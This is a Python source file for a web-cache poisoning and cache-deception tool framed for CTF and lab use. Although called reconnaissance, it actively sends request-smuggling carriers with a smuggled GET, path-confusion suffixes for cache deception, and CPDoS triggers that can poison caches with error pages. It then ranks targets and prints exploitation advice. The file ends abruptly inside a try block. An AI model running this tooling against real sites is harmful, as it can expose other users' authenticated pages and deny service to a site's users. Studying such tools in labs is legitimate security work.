#!/usr/bin/env python3
"""
full_recon.py — Web-cache poisoning / cache-deception reconnaissance for CTFs.

Consolidates the strongest pieces of the discover*/qaqa*/fifi*/ww*/normal* lineage
into one structured recon tool. It does NOT exploit — it maps the attack surface and
ranks which paths are worth attacking, so you can then point an exploit script at them.

What it does, in order:
  Phase 1  Endpoint discovery      — probe a wordlist + user paths, record status/cache/type/sig
  Phase 2  Status-code mapping     — method matrix (GET/POST/PUT/.../bogus) per live endpoint
  Phase 3  Cache behavior          — cacheability, HIT/MISS, and what the cache key includes
                                      (query string? cookie? Vary? path suffix?)
  Phase 4  Proxy<->origin desync   — classify CE/TL vs TL/CE: which framing header the
                                      front-end honors vs the origin (X-Content-Length /
                                      X-Transfer-Encoding / gzip Content-Encoding)
  Phase 5  Cache deception (WCD)    — path-confusion suffixes (.css/.js/;/%2f/%00...) and
                                      Content-Type vs cache mismatches
  Phase 6  CPDoS / unkeyed input   — oversized headers, method-override, bad methods, header
                                      meta-chars (bare LF/CR/NUL) that can cache an error page
  Phase 7  Susceptibility ranking  — score every observed path for poisoning / deception risk

Authorized testing only (CTF / lab / your own systems).

Usage:
  python full_recon.py --host TARGET --port 5002 \
      --cookie "session=<your-token-here>" \
      --path /login --path /join

  python full_recon.py --host TARGET --port 80 --phases 1,3,5   # only some phases

  # Omit --cookie and the tool asks whether the target needs one, then prompts.
  python full_recon.py --host TARGET --port 80
"""

import argparse
import gzip
import hashlib
import json
import re
import socket
import sys
import time
from collections import defaultdict

# --------------------------------------------------------------------------- #
# Configuration (override on the command line)
# --------------------------------------------------------------------------- #

DEFAULTS = {
    "host": "192.168.1.77",
    "port": 5002,
    # No cookie ships with the tool — supply your own with --cookie, or let the
    # script prompt for one interactively (see resolve_cookie below). Never commit
    # a real session token here.
    "cookie": None,
    # endpoint the app uses to flush its cache between tests; set "" if none
    "drop_path": "/drop",
}


def resolve_cookie(value):
    """Return the Cookie header value to use for this run.

    Precedence:
      1. An explicit value (from --cookie, or loaded from a recon JSON file) is
         used verbatim — including an explicit empty string, meaning "no cookie".
      2. If nothing was supplied and we're attached to a terminal, ask whether the
         target needs an auth cookie / session token and, if so, prompt for it.
      3. If nothing was supplied and we're NOT interactive (piped/CI), proceed with
         no cookie rather than blocking.

    This keeps session tokens out of the source tree: each user provides their own.
    """
    if value is not None:
        return value
    if not sys.stdin.isatty():
        return ""
    try:
        ans = input(
            "Does the target require an auth cookie / session token? [y/N] "
        ).strip().lower()
    except EOFError:
        return ""
    if ans in ("y", "yes"):
        try:
            token = input(
                '  paste the full Cookie header value (e.g. "session=abc123"): '
            ).strip()
        except EOFError:
            return ""
        return token
    return ""

# Common CTF / web app endpoints to discover. User --path entries are added to this.
WORDLIST = [
    "/", "/index", "/index.html", "/home",
    "/login", "/logout", "/join", "/register", "/signup", "/signin",
    "/admin", "/dashboard", "/account", "/profile", "/settings",
    "/token", "/api", "/api/", "/api/user", "/api/login", "/api/flag",
    "/flag", "/secret", "/robots.txt", "/favicon.ico", "/sitemap.xml",
    "/static/", "/static/style.css", "/assets/", "/css/", "/js/",
    "/forgot-password", "/reset", "/search", "/cart", "/checkout",
]

# Methods probed against every live endpoint in phase 2.
METHODS = ["GET", "HEAD", "POST", "PUT", "DELETE", "OPTIONS", "PATCH", "TRACE", "FOO"]

# Suffixes appended to a live path to test web-cache-deception path confusion.
# A delimiter is inserted between the path and a fake static filename so the
# front-end caches it as static while the origin still serves the real page.
# The delimiter set is the full matrix from Mirheidari et al. "Cached and Confused"
# (USENIX'20) and "Web Cache Deception Escalates!" (USENIX'22), including the
# double-encoded variants that survive one decode pass at the cache.
WCD_SUFFIXES = [
    # original + single-encoded delimiters
    "/x.css", "/x.js", "/x.jpg", "/x.png", "/x.ico",
    ".css", ".js",
    ";x.css", ";x.js",
    "%2Fx.css", "%2fx.js",
    "%0ax.css", "%00x.css", "%3bx.css", "%23x.css", "%3fx.css",
    "/%2e%2e/x.css", "/..%2fx.css",
    "?x=1.css",
    # double-encoded delimiters (USENIX'22)
    "%252fx.css",          # %2f -> /
    "%25%30%41x.css",      # %0a -> newline
    "%25%30%30x.css",      # %00 -> null
    "%25%33%46x.css",      # %3f -> ?
    "%25%33%42x.css",      # %3b -> ;
    "%25%32%33x.css",      # %23 -> #
    "%25%32%46x.css",      # %2f -> /
]

# Header meta-characters that lenient origins may mis-parse into a different
# (often cacheable error / redirect) response — classic HMC / CPDoS triggers.
META_CHARS = {
    "bareLF": "\n",
    "bareCR": "\r",
    "NUL": "\x00",
    "VT": "\x0b",
    "FF": "\x0c",
    "TAB": "\t",
}

# Custom framing headers this challenge family honors on the ORIGIN only. We test
# both the standard and X- variants so the tool also works on real targets.
TIMEOUT = 6


# --------------------------------------------------------------------------- #
# Low-level socket I/O  (from mm.py / qaqa4.py / discover6.py)
# --------------------------------------------------------------------------- #

class Target:
    """Holds connection config + raw send primitives."""

    def __init__(self, host, port, cookie, drop_path):
        self.host = host
        self.port = port
        self.cookie = cookie
        self.drop_path = drop_path

    def _recv_all(self, s, timeout):
        s.settimeout(timeout)
        data = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(data) > 262144:        # safety cap (oversized/looping responses)
                    break
        except (socket.timeout, OSError):
            pass
        return data

    def send(self, raw, timeout=TIMEOUT):
        """Send one raw request on a fresh connection, return all bytes received."""
        try:
            s = socket.create_connection((self.host, self.port), timeout=timeout)
        except OSError as e:
            return b"HTTP/1.1 000 CONNECT-FAIL\r\n\r\n" + str(e).encode()
        try:
            s.sendall(raw)
            return self._recv_all(s, timeout)
        except OSError:
            return self._recv_all(s, timeout)
        finally:
            s.close()

    def send_pair(self, first, second, delay=0.0, timeout=TIMEOUT):
        """
        Send two requests on a SINGLE socket (connection reuse). This is how you
        nudge front-end<->origin connection reuse and detect request smuggling /
        desync: if `second`'s response is influenced by bytes smuggled past `first`,
        the two parsers disagree about message length.
        """
        try:
            s = socket.create_connection((self.host, self.port), timeout=timeout)
        except OSError as e:
            return b"HTTP/1.1 000 CONNECT-FAIL\r\n\r\n" + str(e).encode()
        try:
            s.sendall(first)
            if delay:
                time.sleep(delay)
            s.sendall(second)
            return self._recv_all(s, timeout)
        except OSError:
            return self._recv_all(s, timeout)
        finally:
            s.close()

    # ---- request builders ------------------------------------------------- #

    def build(self, method, path, headers=None, body=b"", cookie=True,
              add_content_length=None):
        """
        Build a raw HTTP/1.1 request. latin1 keeps arbitrary bytes intact so we
        can inject meta-characters into header values for HMC probing.

        add_content_length:
            None  -> add Content-Length automatically iff there is a body
            True  -> always add it
            False -> never add it (caller frames the body some other way)
        """
        headers = dict(headers or {})
        lines = [f"{method} {path} HTTP/1.1", f"Host: {self.host}:{self.port}"]
        if cookie and self.cookie:
            headers.setdefault("Cookie", self.cookie)
        if add_content_length is None:
            add_content_length = bool(body)
        if add_content_length and not any(k.lower() == "content-length" for k in headers):
            headers["Content-Length"] = str(len(body))
        headers.setdefault("Connection", "close")
        for k, v in headers.items():
            lines.append(f"{k}: {v}")
        head = ("\r\n".join(lines) + "\r\n\r\n").encode("latin1", "replace")
        return head + body

    def drop_cache(self):
        """Flush the app cache between tests, if the target exposes such an endpoint."""
        if self.drop_path:
            self.send(self.build("GET", self.drop_path))


# --------------------------------------------------------------------------- #
# Response parsing / fingerprinting  (discover6.parse + normal5.fp, merged)
# --------------------------------------------------------------------------- #

CACHE_HEADERS = ("cache", "x-cache", "cf-cache-status", "x-drupal-cache",
                 "x-varnish", "age")


def parse(resp):
    """Parse one HTTP response into a rich dict."""
    if not resp:
        return _empty("NO-RESPONSE")
    head, _, body = resp.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n")
    status = lines[0].decode("latin1", "replace") if lines else ""
    hdrs = {}
    for line in lines[1:]:
        if b":" in line:
            k, v = line.split(b":", 1)
            hdrs[k.decode("latin1", "replace").strip().lower()] = \
                v.decode("latin1", "replace").strip()

    # cache status: prefer an explicit HIT/MISS, fall back to presence of Age etc.
    cache_state = "-"
    low = head.lower()
    if b"hit" in low and (b"cache" in low or b"x-cache" in low):
        cache_state = "HIT"
    elif b"miss" in low and (b"cache" in low or b"x-cache" in low):
        cache_state = "MISS"
    elif b"bypass" in low:
        cache_state = "BYPASS"
    elif "age" in hdrs:
        cache_state = f"AGE={hdrs['age']}"

    cache_hdr = next((f"{h}={hdrs[h]}" for h in CACHE_HEADERS if h in hdrs), "-")

    return {
        "status": status,
        "code": _status_code(status),
        "cache_state": cache_state,
        "cache_hdr": cache_hdr,
        "cache_control": hdrs.get("cache-control", "-"),
        "vary": hdrs.get("vary", "-"),
        "content_type": hdrs.get("content-type", "-"),
        "content_length": hdrs.get("content-length", "-"),
        "location": hdrs.get("location", "-"),
        "server": hdrs.get("server", "-"),
        "connection": hdrs.get("connection", "-"),
        "sig": hashlib.sha1(body).hexdigest()[:8],
        "body_len": len(body),
        "headers": hdrs,
    }


def _empty(status):
    return {"status": status, "code": 0, "cache_state": "-", "cache_hdr": "-",
            "cache_control": "-", "vary": "-", "content_type": "-",
            "content_length": "-", "location": "-", "server": "-",
            "connection": "-", "sig": "00000000", "body_len": 0, "headers": {}}


def _status_code(status):
    m = re.search(r"\s(\d{3})\s", " " + status + " ")
    return int(m.group(1)) if m else 0


def split_responses(data):
    """Split a buffer that may contain >1 pipelined HTTP response."""
    return [p for p in re.split(rb"(?=HTTP/1\.1 \d)", data) if p.strip()]


def cache_bust(path):
    """Append a random-ish query param to force a cache MISS (no time module RNG needed)."""
    nonce = hashlib.sha1(str(time.time()).encode()).hexdigest()[:10]
    sep = "&" if "?" in path else "?"
    return f"{path}{sep}cb={nonce}"


# --------------------------------------------------------------------------- #
# Output helpers
# --------------------------------------------------------------------------- #

class C:
    """ANSI colors (disabled with --no-color)."""
    on = True
    @classmethod
    def _c(cls, code, s):
        return f"\033[{code}m{s}\033[0m" if cls.on else s
    @classmethod
    def hdr(cls, s):  return cls._c("1;36", s)
    @classmethod
    def ok(cls, s):   return cls._c("1;32", s)
    @classmethod
    def warn(cls, s): return cls._c("1;33", s)
    @classmethod
    def bad(cls, s):  return cls._c("1;31", s)
    @classmethod
    def dim(cls, s):  return cls._c("2", s)


def phase(title):
    print("\n" + C.hdr("=" * 72))
    print(C.hdr(f"  {title}"))
    print(C.hdr("=" * 72))


def row(info, label):
    code = info["code"]
    color = C.ok if 200 <= code < 300 else C.warn if 300 <= code < 400 else \
        C.bad if code >= 400 else C.dim
    return (f"  {label:<34} {color(str(code) or '---'):>3}  "
            f"cache={info['cache_state']:<8} "
            f"ct={info['content_type'][:24]:<24} "
            f"len={info['body_len']:<6} sig={info['sig']}")


# --------------------------------------------------------------------------- #
# Recon engine
# --------------------------------------------------------------------------- #

class Recon:
    def __init__(self, t, user_paths):
        self.t = t
        self.user_paths = user_paths
        # path -> dict of observed facts used by the scorer in phase 7
        self.facts = defaultdict(lambda: {
            "exists": False, "codes": set(), "cacheable": False,
            "cache_ignores_query": False, "cache_keys_cookie": False,
            "ct_mismatch": False, "wcd_cacheable": False,
            "cacheable_error": False, "desync_signal": False,
            "vary": "-", "baseline_sig": None, "notes": [],
        })
        # framing-relationship conclusions from phase 4
        self.relationship = []

    def note(self, path, msg):
        self.facts[path]["notes"].append(msg)

    # -- Phase 1 ----------------------------------------------------------- #
    def discover_endpoints(self):
        phase("PHASE 1 - Endpoint discovery")
        self.t.drop_cache()
        paths = list(dict.fromkeys(WORDLIST + self.user_paths))  # de-dup, keep order
        live = []
        for p in paths:
            info = parse(self.t.send(self.t.build("GET", p)))
            f = self.facts[p]
            f["codes"].add(info["code"])
            f["vary"] = info["vary"]
            f["baseline_sig"] = info["sig"]
            exists = info["code"] not in (0, 404)
            f["exists"] = exists
            if exists:
                live.append(p)
                print(row(info, p))
            else:
                print(C.dim(row(info, p)))
        # always keep user-supplied paths in scope even if they 404
        for p in self.user_paths:
            if p not in live:
                live.append(p)
        print(C.dim(f"\n  {len(live)} live/in-scope endpoint(s): {', '.join(live)}"))
        return live

    # -- Phase 2 ----------------------------------------------------------- #
    def map_status_codes(self, live):
        phase("PHASE 2 - Status-code / method mapping")
        for p in live:
            print(f"\n  {C.hdr(p)}")
            for m in METHODS:
                body = b"x=1" if m in ("POST", "PUT", "PATCH") else b""
                info = parse(self.t.send(self.t.build(m, p, body=body)))
                self.facts[p]["codes"].add(info["code"])
                print(row(info, f"  {m}"))

    # -- Phase 3 ----------------------------------------------------------- #
    def analyze_cache(self, live):
        phase("PHASE 3 - Cache behavior & cache-key analysis")
        for p in live:
            print(f"\n  {C.hdr(p)}")
            self.t.drop_cache()

            # 1) cacheability: request twice, look for HIT on the second
            r1 = parse(self.t.send(self.t.build("GET", p)))
            r2 = parse(self.t.send(self.t.build("GET", p)))
            cacheable = (r2["cache_state"] == "HIT"
                         or r2["cache_state"].startswith("AGE")
                         or ("public" in r1["cache_control"].lower()))
            self.facts[p]["cacheable"] = cacheable
            print(row(r1, "  req#1"))
            print(row(r2, "  req#2 (repeat)"))
            print(f"    -> cacheable: {C.ok('YES') if cacheable else C.dim('no')}"
                  f"   Cache-Control: {r1['cache_control']}   Vary: {r1['vary']}")

            # 2) does the cache key include the query string?
            #    fetch with a bust param twice; if second is a HIT, query is keyed,
            #    if the busted response matches the cached unbusted one, query ignored
            busted = cache_bust(p)
            b1 = parse(self.t.send(self.t.build("GET", busted)))
            b2 = parse(self.t.send(self.t.build("GET", busted)))
            ignores_query = (b1["sig"] == r1["sig"] and b1["sig"] != "00000000"
                             and "?" not in p)
            self.facts[p]["cache_ignores_query"] = ignores_query
            print(f"    -> query in cache key: "
                  f"{C.dim('ignored') if ignores_query else C.ok('keyed')}"
                  f"  ({'same sig as base' if ignores_query else 'sig differs / keyed'})")
            if ignores_query:
                self.note(p, "cache ignores query string -> unkeyed query payloads possible")

            # 3) does the cache vary on the cookie? compare cookie vs no-cookie body
            self.t.drop_cache()
            with_cookie = parse(self.t.send(self.t.build("GET", p, cookie=True)))
            no_cookie = parse(self.t.send(self.t.build("GET", p, cookie=False)))
            keys_cookie = with_cookie["sig"] != no_cookie["sig"]
            self.facts[p]["cache_keys_cookie"] = keys_cookie
            if cacheable and not keys_cookie and with_cookie["sig"] != "00000000":
                self.note(p, "auth'd content NOT keyed on cookie -> deception/poison can "
                             "leak it to anonymous users")
            print(f"    -> cookie affects body: "
                  f"{C.warn('yes (keyed?)') if keys_cookie else C.bad('no -> shared cache')}")

    # -- Phase 4 ----------------------------------------------------------- #
    def classify_relationship(self, live):
        """
        Determine which length/framing header the FRONT-END honors vs what the
        ORIGIN honors. Disagreement = request smuggling primitive.

        We probe three independent framing dimensions the way the discover*/ww*
        lineage did, and infer the relationship from the origin's reaction:
          - Content-Length    vs  X-Content-Length     (TL: transfer length)
          - Transfer-Encoding vs  X-Transfer-Encoding  (chunked framing)
          - Content-Encoding: gzip                      (CE: decoded vs encoded length)
        """
        phase("PHASE 4 - Proxy<->origin framing relationship (CE/TL vs TL/CE)")
        target = live[0] if live else "/"
        print(C.dim(f"  Probing on {target}\n"))

        plain = b"A" * 500
        gz = gzip.compress(plain)

        # Reference: what does a clean POST look like?
        self.t.drop_cache()
        ref = parse(self.t.send(self.t.build("POST", target, {"X-Hack-Mode": "1"},
                                             body=b"x=1")))
        print(row(ref, "POST x=1 (reference)"))

        # (a) Does the ORIGIN honor a custom transfer-length header (X-Content-Length)?
        #     Send a real Content-Length but an X-Content-Length that disagrees.
        #     A status/length change keyed to X-Content-Length => origin trusts X-CL.
        honors_xcl = self._probe_header_honored(
            target, "X-Content-Length", plain, ref,
            real_cl=True, label="X-Content-Length (TL)")

        # (b) Does the ORIGIN honor X-Transfer-Encoding: chunked?
        #     Body is chunked-terminated early (0\r\n\r\n) + trailing bytes.
        honors_xte = self._probe_chunked_honored(target, ref)

        # (c) gzip Content-Encoding: do decoded vs encoded lengths change behavior?
        honors_ce = self._probe_gzip(target, plain, gz, ref)

        # (d) Active desync confirmation: smuggle a marker request past the front-end
        #     using send_pair, then see if a clean follow-up is influenced.
        desync = self._probe_active_desync(target)

        # ---- conclude the relationship --------------------------------------- #
        print("\n  " + C.hdr("Relationship summary:"))
        conclusions = []
        if honors_xcl:
            conclusions.append("origin honors X-Content-Length (custom TL) while a "
                               "standard front-end keys on Content-Length  => CL/TL desync")
        if honors_xte:
            conclusions.append("origin honors X-Transfer-Encoding: chunked while front-end "
                               "uses Content-Length  => CL.TE smuggling (front=CL, origin=TE)")
        if honors_ce:
            conclusions.append("origin decodes Content-Encoding: gzip => encoded/decoded "
                               "length disagreement (CE/TL) usable for body-size desync")
        if desync:
            conclusions.append("ACTIVE: a follow-up request on a reused connection changed "
                               "after smuggling => confirmed front-end/origin desync")
        if not conclusions:
            conclusions.append("no clear framing disagreement detected with these probes "
                               "(target may be single-tier, or strict on both ends)")
        for c in conclusions:
            tag = C.bad("[DESYNC] ") if c != conclusions[0] or len(conclusions) and \
                ("desync" in c or "smuggling" in c or "ACTIVE" in c) else ""
            print(f"    - {tag}{c}")
        self.relationship = conclusions
        if honors_xcl or honors_xte or honors_ce or desync:
            self.facts[target]["desync_signal"] = True

    def _probe_header_honored(self, path, header, plain, ref, real_cl, label):
        """Send body with header set to several values; report if origin reacts to it."""
        print(f"\n  -- {label} --")
        reacted = False
        seen = {}
        for val in (0, 10, len(plain), len(plain) + 50):
            hdrs = {"X-Hack-Mode": "1", header: str(val)}
            raw = self.t.build("POST", path, hdrs, body=plain,
                               add_content_length=real_cl)
            info = parse(self.t.send(raw))
            seen[val] = (info["code"], info["sig"], info["body_len"])
            print(row(info, f"  {header}={val}"))
        # if behavior changes across X-* values, the origin is reading that header
        distinct = {v for v in seen.values()}
        if len(distinct) > 1:
            reacted = True
            print(C.warn(f"    -> origin reacts to {header} "
                         f"(behavior varies across values)"))
        else:
            print(C.dim(f"    -> {header} appears ignored"))
        return reacted

    def _probe_chunked_honored(self, path, ref):
        print("\n  -- X-Transfer-Encoding: chunked --")
        # body ends the chunked stream early; trailing bytes only matter if origin
        # parses chunked (and would be left in the buffer => smuggling)
        trailing = b"GET /SMUGGLE-MARKER HTTP/1.1\r\nHost: x\r\n\r\n"
        body = b"0\r\n\r\n" + trailing
        raw = self.t.build("POST", path, {
            "X-Hack-Mode": "1",
            "X-Transfer-Encoding": "chunked",
            "Content-Length": str(len(body)),
        }, body=body, add_content_length=False)
        info = parse(self.t.send(raw))
        print(row(info, "  X-TE chunked + 0-term + trailing"))
        # Compare to the standard Transfer-Encoding header too
        raw2 = self.t.build("POST", path, {
            "X-Hack-Mode": "1",
            "Transfer-Encoding": "chunked",
            "Content-Length": str(len(body)),
        }, body=body, add_content_length=False)
        info2 = parse(self.t.send(raw2))
        print(row(info2, "  TE chunked + 0-term + trailing"))
        reacted = info["sig"] != ref["sig"] or info["code"] != ref["code"] \
            or info2["sig"] != ref["sig"]
        print(C.warn("    -> origin appears to parse a chunked framing")
              if reacted else C.dim("    -> no chunked parsing signal"))
        return reacted

    def _probe_gzip(self, path, plain, gz, ref):
        print("\n  -- Content-Encoding: gzip (decoded vs encoded length) --")
        reacted = False
        for label, xcl in [("XCL=compressed", len(gz)), ("XCL=decoded", len(plain)),
                           ("XCL=0", 0)]:
            raw = self.t.build("POST", path, {
                "X-Hack-Mode": "1",
                "Content-Encoding": "gzip",
                "X-Content-Length": str(xcl),
                "Content-Length": str(len(gz)),
            }, body=gz, add_content_length=False)
            info = parse(self.t.send(raw))
            print(row(info, f"  gzip {label}"))
            if info["sig"] != ref["sig"] or info["code"] != ref["code"]:
                reacted = True
        print(C.warn("    -> origin decodes gzip / reacts to decoded length")
              if reacted else C.dim("    -> no gzip CE signal"))
        return reacted

    def _probe_active_desync(self, path):
        print("\n  -- Active desync confirmation (connection reuse) --")
        self.t.drop_cache()
        baseline = parse(self.t.send(self.t.build("GET", path)))
        # carrier: front-end thinks body ends per Content-Length; origin (if it honors
        # X-Transfer-Encoding) stops at 0-chunk, leaving the smuggled GET in the buffer.
        smuggled = (f"GET /doesnotexist HTTP/1.1\r\nHost: {self.t.host}:{self.t.port}\r\n"
                    f"X-Foo:").encode()
        body = b"0\r\n\r\n" + smuggled
        carrier = self.t.build("POST", path, {
            "X-Hack-Mode": "1",
            "X-Transfer-Encoding": "chunked",
            "Content-Length": str(len(body)),
        }, body=body, add_content_length=False)
        victim = self.t.build("GET", path, cookie=False)
        changed = False
        for i in range(4):
            self.t.send_pair(carrier, victim)
            chk = parse(self.t.send(self.t.build("GET", path, cookie=False)))
            if chk["sig"] != baseline["sig"] and chk["sig"] != "00000000":
                print(C.bad(f"    try {i}: follow-up changed "
                            f"{baseline['sig']} -> {chk['sig']}  <<< DESYNC"))
                changed = True
                break
            time.sleep(0.25)
        if not changed:
            print(C.dim("    no follow-up change observed (no smuggling via this carrier)"))
        self.t.drop_cache()
        return changed

    # -- Phase 5 ----------------------------------------------------------- #
    def probe_deception(self, live):
        phase("PHASE 5 - Web cache deception (path confusion)")
        for p in live:
            base = parse(self.t.send(self.t.build("GET", p)))
            if base["code"] in (0, 404):
                continue
            print(f"\n  {C.hdr(p)}  (base ct={base['content_type'][:30]}, "
                  f"sig={base['sig']})")
            base_is_html = "html" in base["content_type"].lower()
            for suf in WCD_SUFFIXES:
                probe_path = p.rstrip("/") + suf
                self.t.drop_cache()
                r1 = parse(self.t.send(self.t.build("GET", probe_path)))
                r2 = parse(self.t.send(self.t.build("GET", probe_path)))
                if r1["code"] in (0,):
                    continue
                # cache deception signal:
                #  - the suffixed path still returns the real (HTML/secret) body, AND
                #  - it looks cacheable (HIT on repeat, or static-looking content-type)
                served_real = (r1["sig"] == base["sig"] and base["sig"] != "00000000")
                looks_static = any(ext in suf for ext in (".css", ".js", ".jpg",
                                                          ".png", ".ico"))
                ct_mismatch = base_is_html and looks_static and served_real
                cached = (r2["cache_state"] == "HIT"
                          or "public" in r1["cache_control"].lower())
                flag = ""
                if ct_mismatch and cached:
                    flag = C.bad("  <<< DECEPTION: real page cached as static")
                    self.facts[p]["ct_mismatch"] = True
                    self.facts[p]["wcd_cacheable"] = True
                    self.note(p, f"WCD via '{suf}': page body cached under static-looking URL")
                elif served_real and cached:
                    flag = C.warn("  <- real body, cacheable")
                    self.facts[p]["wcd_cacheable"] = True
                if flag or served_real:
                    print(row(r1, f"  {suf}") + flag)

    # -- Phase 6 ----------------------------------------------------------- #
    def probe_cpdos(self, live):
        phase("PHASE 6 - CPDoS / unkeyed-input probing")
        for p in live:
            base = parse(self.t.send(self.t.build("GET", p)))
            if base["code"] in (0, 404):
                continue
            print(f"\n  {C.hdr(p)}  (base code={base['code']})")

            # (1) oversized header (HHO) — may push an error that gets cached
            self.t.drop_cache()
            big = self.t.build("GET", p, {"X-Big": "A" * 20000})
            r = parse(self.t.send(big))
            self._cpdos_check(p, "oversized header (20k)", base, r)

            # (2) method-override headers
            for h in ("X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override"):
                self.t.drop_cache()
                r = parse(self.t.send(self.t.build("GET", p, {h: "POST",
                                                              "X-Hack-Mode": "1"})))
                self._cpdos_check(p, f"{h}: POST", base, r)

            # (3) bogus / unsafe methods that may yield a cacheable 405/501
            for m in ("FOO", "TRACK"):
                self.t.drop_cache()
                r = parse(self.t.send(self.t.build(m, p)))
                self._cpdos_check(p, f"method {m}", base, r)

            # (4) header meta-characters (HMC) — bare LF/CR/NUL etc. in a value
            for name, ch in META_CHARS.items():
                self.t.drop_cache()
                raw = self.t.build("GET", p, {"X-Probe": f"a{ch}b"})
                r = parse(self.t.send(raw))
                self._cpdos_check(p, f"meta-char {name}", base, r)

    def _cpdos_check(self, path, label, base, r):
        differs = (r["code"] != base["code"] and r["code"] != 0)
        cacheable_err = differs and (r["cache_state"] == "HIT"
                                     or "public" in r["cache_control"].lower()
                                     or r["code"] >= 400)
        # confirm it actually caches: repeat without the bad header, look for the error
        flag = ""
        if differs:
            follow = parse(self.t.send(self.t.build("GET", path)))
            poisoned = follow["code"] == r["code"] and follow["code"] != base["code"]
            if poisoned:
                flag = C.bad(f"  <<< CPDoS: clean GET now returns {r['code']} "
                             f"(was {base['code']})")
                self.facts[path]["cacheable_error"] = True
                self.note(path, f"CPDoS via {label}: poisons cache with {r['code']}")
                self.t.drop_cache()
            elif cacheable_err:
                flag = C.warn(f"  <- {base['code']}->{r['code']}, looks cacheable")
        if differs:
            print(row(r, f"  {label}") + flag)

    # -- Phase 7 ----------------------------------------------------------- #
    def _score(self):
        """Return [(score, path, reasons, facts), ...] sorted high-to-low."""
        scored = []
        for path, f in self.facts.items():
            if not (f["exists"] or path in self.user_paths):
                continue
            score = 0
            reasons = []
            if f["cacheable"]:
                score += 2; reasons.append("cacheable")
            if f["cacheable"] and not f["cache_keys_cookie"]:
                score += 3; reasons.append("auth content on shared cache key")
            if f["cache_ignores_query"]:
                score += 2; reasons.append("query unkeyed (poison via param)")
            if f["ct_mismatch"]:
                score += 4; reasons.append("CT-mismatch deception")
            if f["wcd_cacheable"]:
                score += 2; reasons.append("WCD path cacheable")
            if f["cacheable_error"]:
                score += 4; reasons.append("CPDoS cacheable error")
            if f["desync_signal"]:
                score += 4; reasons.append("front-end/origin desync")
            scored.append((score, path, reasons, f))
        scored.sort(key=lambda x: -x[0])
        return scored

    def _suggest_source(self, target):
        """Pick a different live path whose body differs from target (for substitution)."""
        tgt = self.facts.get(target, {})
        tsig = tgt.get("baseline_sig")
        candidates = [p for p, f in self.facts.items()
                      if p != target and f.get("exists")
                      and f.get("baseline_sig") not in (None, "00000000")]
        # prefer one with a clearly different body
        for p in candidates:
            if self.facts[p].get("baseline_sig") != tsig:
                return p
        return candidates[0] if candidates else None

    def export_json(self, path):
        """Write machine-readable recon results for full_attack.py --from-recon."""
        scored = self._score()
        best = scored[0] if scored else None
        ranking = []
        for score, p, reasons, f in scored:
            facts = dict(f)
            facts["codes"] = sorted(c for c in f["codes"] if c)  # set -> list
            ranking.append({"score": score, "path": p, "reasons": reasons,
                            "facts": facts})
        out = {
            "host": self.t.host, "port": self.t.port,
            "cookie": self.t.cookie, "drop_path": self.t.drop_path,
            "relationship": self.relationship,
            "best": ({"target": best[1], "score": best[0],
                      "source": self._suggest_source(best[1])} if best else None),
            "ranking": ranking,
        }
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(out, fh, indent=2)
        print(C.dim(f"\n  recon results written to {path} "
                    f"(use: full_attack.py --from-recon {path})"))

    def rank(self):
        phase("PHASE 7 - Susceptibility ranking")
        scored = self._score()
        if not scored:
            print(C.dim("  No scorable endpoints."))
            return
        print(f"\n  {'SCORE':<6}{'PATH':<30}WHY")
        print("  " + "-" * 68)
        for score, path, reasons, f in scored:
            tag = C.bad if score >= 7 else C.warn if score >= 4 else \
                C.ok if score >= 2 else C.dim
            why = ", ".join(reasons) if reasons else "no strong signal"
            print(f"  {tag(str(score)):<6}{path:<30}{why}")

        top = scored[0]
        if top[0] >= 4:
            print("\n  " + C.bad(f"BEST TARGET: {top[1]}  (score {top[0]})"))
            print("  Recommended next step:")
            f = top[3]
            if f["ct_mismatch"]:
                print(C.dim("   - Cache deception: request the static-looking URL as the "
                            "victim, then read the cached authed page."))
            if f["cacheable_error"]:
                print(C.dim("   - CPDoS: fire the error-triggering request, then victims "
                            "get the cached error (DoS)."))
            if f["desync_signal"]:
                print(C.dim("   - Smuggling: use send_pair() with the CL.TE/TE.CL carrier "
                            "to poison the shared cache entry."))
            if f["cacheable"] and not f["cache_keys_cookie"]:
                print(C.dim("   - Unkeyed cookie: poison the shared entry; anonymous users "
                            "receive your injected response."))

        if self.relationship:
            print("\n  " + C.hdr("Framing relationship (from phase 4):"))
            for c in self.relationship:
                print(f"    - {c}")


# --------------------------------------------------------------------------- #
# Main
# --------------------------------------------------------------------------- #

def main():
    ap = argparse.ArgumentParser(
        description="Web-cache poisoning / deception recon for CTFs (authorized use only).")
    ap.add_argument("--host", default=DEFAULTS["host"])
    ap.add_argument("--port", type=int, default=DEFAULTS["port"])
    ap.add_argument("--cookie", default=DEFAULTS["cookie"],
                    help="Cookie header value (auth/session token). If omitted, "
                         "you'll be asked whether the target needs one. Use "
                         '--cookie "" to force no cookie without being prompted.')
    ap.add_argument("--drop-path", default=DEFAULTS["drop_path"],
                    help="cache-flush endpoint (set '' if none)")
    ap.add_argument("--path", action="append", default=[],
                    help="extra path to include (repeatable)")
    ap.add_argument("--phases", default="1,2,3,4,5,6,7",
                    help="comma list of phases to run, e.g. 1,3,5")
    ap.add_argument("--json", metavar="PATH",
                    help="write machine-readable results for full_attack.py --from-recon")
    ap.add_argument("--no-color", action="store_true")
    args = ap.parse_args()

    if args.no_color or not sys.stdout.isatty():
        C.on = False

    args.cookie = resolve_cookie(args.cookie)
    t = Target(args.host, args.port, args.cookie, args.drop_path)
    recon = Recon(t, args.path)
    phases = {p.strip() for p in args.phases.split(",") if p.strip()}

    print(C.hdr(f"\nfull_recon -> {args.host}:{args.port}"))
    print(C.dim(f"cookie: {args.cookie or '(none)'}   drop: {args.drop_path or '(none)'}"))

    live = []
    if "1" in phases:
        live = recon.discover_endpoints()
    else:
        # if phase 1 is skipped, seed scope from user paths + a few defaults
        live = list(dict.fromkeys(args.path + ["/", "/login", "/join"]))
        for p in live:
            recon.facts[p]["exists"] = True

    if "2" in phases:
        recon.map_status_codes(live)
    if "3" in phases:
        recon.analyze_cache(live)
    if "4" in phases:
        recon.classify_relationship(live)
    if "5" in phases:
        recon.probe_deception(live)
    if "6" in phases:
        recon.probe_cpdos(live)
    if "7" in phases:
        recon.rank()

    # JSON export needs scoring data; ensure phase 7 logic is available even if its
    # printout was skipped (the score is computed from whatever phases did run).
    if args.json:
        recon.export_json(args.json)

    print()


if __name__ == "__main__":
    try:
        main()
